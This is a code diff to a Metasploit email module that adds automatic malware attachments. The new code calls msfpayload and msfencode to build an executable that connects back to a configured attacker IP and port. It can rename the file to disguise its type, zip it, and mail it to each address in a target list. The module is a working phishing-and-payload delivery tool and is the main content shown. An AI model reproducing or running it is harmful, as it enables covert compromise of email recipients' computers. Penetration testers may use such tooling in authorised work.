@@ -63,7 +63,19 @@ class Metasploit3 < Msf::Auxiliary
 		attachment_file = yamlconf['attachment_file']
 		attachment_file_type = yamlconf['attachment_file_type']
 		attachment_file_name = yamlconf['attachment_file_name']
-		
+       
+        ### payload options ###
+        make_payload    = yamlconf['make_payload']
+        zip_payload     = yamlconf['zip_payload']
+        msf_port        = yamlconf['msf_port']
+        msf_ip          = yamlconf['msf_ip']
+        msf_payload     = yamlconf['msf_payload']
+        msf_location    = yamlconf['msf_location']
+        msf_filename    = yamlconf['msf_filename']
+        msf_change_ext  = yamlconf['msf_change_ext']
+        msf_payload_ext = yamlconf['msf_payload_ext']
+
+
 		datastore['MAILFROM'] = from
 		
 		msg = File.open(msg_file).read
@@ -73,7 +85,35 @@ class Metasploit3 < Msf::Auxiliary
 		if (type !~ /text/i and type !~ /text\/html/i)	
 			print_error("YAML config: #{type}")
 		end
-	
+        
+        if  make_payload 
+
+            print_status("Creating payload...")
+            system(
+                "#{msf_location}/msfpayload #{msf_payload} LHOST=#{msf_ip} LPORT=#{msf_port} R | #{msf_location}/msfencode -t exe -o /tmp/#{msf_filename} > /dev/null 2>&1")
+
+            if msf_change_ext 
+                msf_payload_newext = msf_filename
+                msf_payload_newext = msf_payload_newext.gsub /\.\w+/, ".#{msf_payload_ext}"
+                system("mv /tmp/#{msf_filename} /tmp/#{msf_payload_newext}")
+                msf_filename = msf_payload_newext
+            end
+
+            if zip_payload 
+                zip_file = msf_filename
+                zip_file = zip_file.gsub /\.\w+/, '.zip' 
+                system("zip -r /tmp/#{zip_file} /tmp/#{msf_filename} > /dev/null 2>&1");
+                msf_filename         = zip_file
+                attachment_file_type = 'application/zip'
+            else 
+                attachment_file_type = 'application/exe'
+            end
+
+            attachment_file = "/tmp/#{msf_filename}"
+            attachment_file_name = msf_filename
+        end
+
+
 		File.open(fileto).each do |l|
 			if l !~ /\@/
 				nil
@@ -86,7 +126,6 @@ class Metasploit3 < Msf::Auxiliary
 			email = nem[1]
 			
 			
-			print_status("[#{add_name}]")
 			if add_name 
 				email_msg_body = "#{fname},\n\n#{msg}" 			
 			else 
@@ -98,7 +137,7 @@ class Metasploit3 < Msf::Auxiliary
 				email_msg_body = "#{email_msg_body}\n#{data_sig}"
 			end
 			
-			print_status("Emailing #{name} at #{email}")
+			print_status("Emailing #{name[0]} #{name[1]} at #{email}")
 
 			mime_msg = Rex::MIME::Message.new
 			mime_msg.mime_defaults
